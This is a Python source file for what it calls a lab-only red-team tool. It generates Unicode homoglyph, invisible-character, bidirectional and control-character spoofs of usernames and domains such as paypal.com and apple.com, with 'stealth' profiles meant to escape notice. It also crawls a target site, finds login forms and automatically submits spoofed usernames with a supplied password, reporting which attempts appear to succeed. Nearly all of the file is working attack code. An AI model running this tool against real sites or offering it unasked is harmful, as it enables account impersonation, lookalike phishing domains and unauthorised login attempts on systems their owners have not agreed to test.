#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import random
import argparse
import json
from typing import List, Dict, Optional

# --- Confusable / homoglyph map ---
LATIN_TO_SPOOF = {
    "a": ["а", "ɑ", "ά", "𝖆", "𝖺"],
    "b": ["Ь", "Ƅ", "𝖇"],
    "c": ["с", "ϲ", "𝖈"],
    "d": ["ԁ", "ɗ", "𝖉"],
    "e": ["е", "ɛ", "є", "𝖊"],
    "f": ["ƒ", "ғ", "𝖋"],
    "g": ["ɡ", "ɢ", "𝖌"],
    "h": ["һ", "ḥ", "𝖍"],
    "i": ["і", "í", "ɩ", "ӏ", "𝖎"],
    "j": ["ј", "𝖏"],
    "k": ["κ", "қ", "𝖐"],
    "l": ["ⅼ", "ӏ", "ƚ", "𝖑"],
    "m": ["м", "ṃ", "𝖒"],
    "n": ["η", "ո", "ṅ", "𝖓"],
    "o": ["о", "ο", "ɵ", "օ", "𝖔"],
    "p": ["р", "ρ", "𝖕"],
    "q": ["զ", "𝖖"],
    "r": ["г", "ř", "𝖗"],
    "s": ["ѕ", "ʂ", "ś", "𝖘"],
    "t": ["т", "ť", "ƚ", "𝖙"],
    "u": ["υ", "ս", "ü", "𝖚"],
    "v": ["ѵ", "ν", "𝖛"],
    "w": ["ѡ", "ա", "ŵ", "𝖜"],
    "x": ["х", "ҳ", "×", "𝖝"],
    "y": ["у", "γ", "ү", "𝖞"],
    "z": ["ž", "ʐ", "ƶ", "𝖟"],
    ".": ["․", "．"],
    "-": ["‐", "-"],
    "_": ["‗", "＿"],
}

LATIN_TO_SPOOF_UPPER = {k: [v.upper() if v.upper() != v else v for v in vals] for k, vals in LATIN_TO_SPOOF.items()}

INVISIBLES = ["\u200B", "\u200C", "\u200D", "\u2060", "\u2063", "\u2064"]
DIRECTIONALS = ["\u202E", "\u202D", "\u202A", "\u202B", "\u2066", "\u2067"]
COMBINING = ["\u0300", "\u0301", "\u0302", "\u0303", "\u0304", "\uFE0E", "\uFE0F"]
CONTROLS = ["\x00", "\x1B", "\x07"]

# --- Stealth profiles ---
STEALTH_PROFILES = {
    "max": {"homoglyph":0.2, "invisible":0.05, "combining":0.05, "directional":0.01, "control":0.0},
    "moderate": {"homoglyph":0.4, "invisible":0.1, "combining":0.08, "directional":0.02, "control":0.01},
    "aggressive": {"homoglyph":0.6, "invisible":0.2, "combining":0.15, "directional":0.05, "control":0.03}
}

# --- Segment awareness ---
def get_segment_indices(text: str) -> Dict[int,str]:
    segments = {}
    if "@" in text:
        user, domain = text.split("@", 1)
        for i in range(len(user)):
            segments[i] = "username"
        parts = domain.split(".")
        offset = len(user)+1
        for part in parts[:-1]:
            for i in range(len(part)):
                segments[offset+i] = "domain"
            offset += len(part)+1
        for i in range(offset, len(text)):
            segments[i] = "tld"
    elif "/" in text:
        domain, path = text.split("/",1)
        for i in range(len(domain)):
            segments[i] = "domain"
        for i in range(len(domain)+1, len(text)):
            segments[i] = "path"
    else:
        for i in range(len(text)):
            segments[i] = "body"
    return segments

# --- Core spoof function ---
def worst_case_spoof(
    text: str,
    profile: str = "moderate",
    stealth: Optional[bool] = None,
    allow_controls: bool = False,
    safe: bool = False,
    seed: Optional[int] = None,
    detailed_vectors: bool = False,
) -> Dict[str,object]:
    rnd = random.Random(seed)

    if stealth is not None:
        profile = "max" if stealth else "aggressive"

    probs = STEALTH_PROFILES.get(profile, STEALTH_PROFILES["moderate"])
    segments = get_segment_indices(text)

    result = []
    vectors = []

    for idx, ch in enumerate(text):
        segment = segments.get(idx, "body")

        # homoglyph
        if not safe and ch.lower() in LATIN_TO_SPOOF and rnd.random() < probs["homoglyph"]:
            replacement = rnd.choice(LATIN_TO_SPOOF_UPPER[ch.lower()] if ch.isupper() else LATIN_TO_SPOOF[ch.lower()])
            if ch.isupper():
                try: replacement = replacement.upper()
                except: pass
            result.append(replacement)
            vectors.append({"type":"homoglyph","pos":idx,"segment":segment})
        else:
            result.append(ch)

        # invisibles
        if not safe and ch.isalpha() and rnd.random() < probs["invisible"]:
            invisible = rnd.choice(INVISIBLES)
            result.append(invisible)
            vectors.append({"type":"invisible","pos":idx,"segment":segment})

        # combining
        if not safe and rnd.random() < probs["combining"]:
            combining = rnd.choice(COMBINING)
            result.append(combining)
            vectors.append({"type":"combining","pos":idx,"segment":segment})

        # directional
        if not safe and rnd.random() < probs["directional"]:
            directional = rnd.choice(DIRECTIONALS)
            result.append(directional)
            vectors.append({"type":"directional","pos":idx,"segment":segment})

        # control
        if not safe and allow_controls and rnd.random() < probs["control"]:
            ctrl = rnd.choice(CONTROLS)
            result.append(ctrl)
            vectors.append({"type":"control","pos":idx,"segment":segment})

    if not detailed_vectors:
        seen = {}
        vectors = list(seen.fromkeys([v["type"] if isinstance(v,dict) else v for v in vectors])) or ["none"]

    return {"spoofed":"".join(result), "vectors":vectors}

# --- Corpus generator ---
def generate_attack_corpus(
    base_list: List[str],
    variants_per_item: int = 5,
    profile: str = "moderate",
    seed: Optional[int] = None,
    allow_controls: bool = False,
    safe: bool = False,
    per_item_seed: bool = False,
    detailed_vectors: bool = False
) -> List[Dict]:
    corpus = []
    for idx, item in enumerate(base_list):
        for j in range(variants_per_item):
            call_seed = hash((item,j,seed)) & 0xFFFFFFFF if seed is not None and per_item_seed else seed
            spoofed_obj = worst_case_spoof(item, profile=profile, allow_controls=allow_controls,
                                           safe=safe, seed=call_seed, detailed_vectors=detailed_vectors)
            corpus.append({
                "original": item,
                "spoofed": spoofed_obj["spoofed"],
                "vectors": spoofed_obj["vectors"],
                "profile": profile,
                "allow_controls": allow_controls,
                "safe": safe
            })
    return corpus

def escape_unicode(s: str) -> str:
    return "".join(f"\\u{ord(c):04x}" for c in s)


# --- Optional site testing utilities (lazy-import requests/bs4) ---
def find_forms(url: str, session) -> List[Dict]:
    """Return detected login forms (username/password) on a page. Uses lazy imports.
    Returns empty list on fetch or dependency errors.
    """
    try:
        import requests  # noqa: F401
        from bs4 import BeautifulSoup
    except Exception:
        # Missing optional deps; caller should handle accordingly
        return []

    try:
        r = session.get(url, timeout=5)
        r.raise_for_status()
    except Exception:
        return []

    soup = BeautifulSoup(r.text, "html.parser")
    forms = []
    for form in soup.find_all("form"):
        form_info = {
            "action": form.get("action") or url,
            "method": form.get("method", "post").lower(),
            "inputs": {i.get("name"): i for i in form.find_all("input") if i.get("name")}
        }
        form_info["username_field"] = None
        form_info["password_field"] = None
        form_info["csrf_field"] = None
        for name, tag in form_info["inputs"].items():
            typ = (tag.get("type") or "text").lower()
            if "user" in name.lower() or "email" in name.lower():
                form_info["username_field"] = name
            elif "pass" in name.lower():
                form_info["password_field"] = name
            elif typ == "hidden" and "csrf" in name.lower():
                form_info["csrf_field"] = name
        if form_info["username_field"] and form_info["password_field"]:
            forms.append(form_info)
    return forms


def test_form(session, url: str, form: Dict, spoofed_username: str, password: str) -> Dict:
    data = {}
    for name, tag in form["inputs"].items():
        if name == form["username_field"]:
            data[name] = spoofed_username
        elif name == form["password_field"]:
            data[name] = password
        elif name == form.get("csrf_field"):
            data[name] = tag.get("value", "")
        else:
            data[name] = tag.get("value", "")
    try:
        from urllib.parse import urljoin
        action_url = urljoin(url, form.get("action") or url)
        if form.get("method", "post").lower() == "post":
            resp = session.post(action_url, data=data, timeout=5)
        else:
            resp = session.get(action_url, params=data, timeout=5)
        success = "fail" if "invalid" in (resp.text or "").lower() else "success"
        return {"status_code": resp.status_code, "result": success}
    except Exception as e:
        return {"status_code": "ERROR", "result": str(e)}


def crawl_site(url: str, max_depth: int = 2):
    try:
        import requests
        from bs4 import BeautifulSoup
        from urllib.parse import urljoin, urlparse
    except Exception:
        return [], None

    session = requests.Session()
    visited = set()
    to_visit = [(url, 0)]
    forms_found = []

    while to_visit:
        current_url, depth = to_visit.pop(0)
        if depth > max_depth or current_url in visited:
            continue
        visited.add(current_url)
        try:
            r = session.get(current_url, timeout=5)
            r.raise_for_status()
        except Exception:
            continue

        soup = BeautifulSoup(r.text, "html.parser")
        forms = find_forms(current_url, session)
        forms_found.extend([(current_url, f) for f in forms])

        for a in soup.find_all("a", href=True):
            link = urljoin(current_url, a["href"])
            if urlparse(link).netloc == urlparse(url).netloc and link not in visited:
                to_visit.append((link, depth + 1))

    return forms_found, session


def run_site_test(
    base_url: str,
    usernames: List[str],
    password: str,
    variants: int = 3,
    profile: str = "moderate",
    detailed_vectors: bool = False,
    escape: bool = False,
):
    forms_found, session = crawl_site(base_url)
    report = []
    for page_url, form in forms_found:
        corpus = generate_attack_corpus(usernames, variants_per_item=variants, profile=profile, detailed_vectors=detailed_vectors)
        for entry in corpus:
            spoofed_username = entry["spoofed"]
            result = test_form(session, page_url, form, spoofed_username, password)
            report.append({
                "page": page_url,
                "original_username": entry["original"],
                "spoofed_username": escape_unicode(spoofed_username) if escape else spoofed_username,
                "vectors": entry["vectors"],
                "status_code": result["status_code"],
                "result": result["result"],
            })
    return report


def site_tester_main():
    parser = argparse.ArgumentParser(description="Automated Red-Team Unicode Login Testing (Lab Only)")
    parser.add_argument("url", help="Base URL of site to scan (lab/staging only)")
    parser.add_argument("-u", "--usernames", nargs="+", required=True)
    parser.add_argument("-p", "--password", required=True)
    parser.add_argument("-n", "--variants", type=int, default=3)
    parser.add_argument("--profile", choices=["max", "moderate", "aggressive"], default="moderate")
    parser.add_argument("--detailed-vectors", action="store_true")
    parser.add_argument("--escape", action="store_true")
    parser.add_argument("--json", action="store_true")
    args = parser.parse_args()

    report = run_site_test(
        base_url=args.url,
        usernames=args.usernames,
        password=args.password,
        variants=args.variants,
        profile=args.profile,
        detailed_vectors=args.detailed_vectors,
        escape=args.escape,
    )

    if args.json:
        print(json.dumps(report, indent=2, ensure_ascii=False))
    else:
        print("=== Automated Red-Team Unicode Test Report ===")
        for r in report:
            print(f"[{r['page']}] {r['original_username']} -> {r['spoofed_username']} [vectors: {r['vectors']}] | Status: {r['status_code']} | Result: {r['result']}")

# --- CLI ---
def main(argv=None):
    parser = argparse.ArgumentParser(description="Advanced Unicode spoof generator for red-team testing.")
    parser.add_argument("samples", nargs="*", help="Input strings to spoof")
    parser.add_argument("--variants","-n",type=int,default=5)
    parser.add_argument("--profile",choices=["max","moderate","aggressive"],default="moderate")
    parser.add_argument("--stealth",action="store_true",help="Legacy boolean: sets profile=max")
    parser.add_argument("--seed",type=int,default=None)
    parser.add_argument("--disable-controls",action="store_true")
    parser.add_argument("--safe",action="store_true")
    parser.add_argument("--per-item-seed",action="store_true")
    parser.add_argument("--detailed-vectors",action="store_true")
    parser.add_argument("--escape",action="store_true")
    parser.add_argument("--json",action="store_true")
    args = parser.parse_args(argv)

    profile = "max" if args.stealth else args.profile
    allow_controls = not args.disable_controls
    base_samples = args.samples or ["admin","root","test_user","password","paypal.com","apple.com","evilfile.jpg"]

    corpus = generate_attack_corpus(base_samples, variants_per_item=args.variants,
                                    profile=profile, seed=args.seed,
                                    allow_controls=allow_controls, safe=args.safe,
                                    per_item_seed=args.per_item_seed, detailed_vectors=args.detailed_vectors)

    if args.json:
        print(json.dumps(corpus,indent=2,ensure_ascii=False))
    else:
        for entry in corpus:
            spoofed = escape_unicode(entry["spoofed"]) if args.escape else entry["spoofed"]
            vecs = entry["vectors"]
            if isinstance(vecs,list):
                vecs = ','.join([v["type"] if isinstance(v,dict) else v for v in vecs])
            print(f"{entry['original']} -> {spoofed}  [vectors: {vecs}]")

if __name__ == "__main__":
    main()
